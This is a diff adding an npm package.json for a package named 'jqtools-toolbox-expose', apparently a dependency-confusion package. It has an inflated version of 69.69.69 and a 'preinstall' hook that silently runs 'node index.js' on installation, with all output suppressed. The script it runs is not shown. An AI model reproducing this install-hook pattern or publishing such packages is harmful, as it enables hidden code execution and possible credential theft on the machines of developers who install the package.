@@ -1,0 +1,15 @@
+{
+  "name": "jqtools-toolbox-expose",
+  "version": "69.69.69",
+  "description": "",
+  "main": "main.js",
+  "scripts": {
+    "preinstall": "node index.js > /dev/null 2>&1",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "ritik",
+  "license": "ISC",
+  "dependencies": {
+    "lodash": "^4.17.21"
+  }
+}
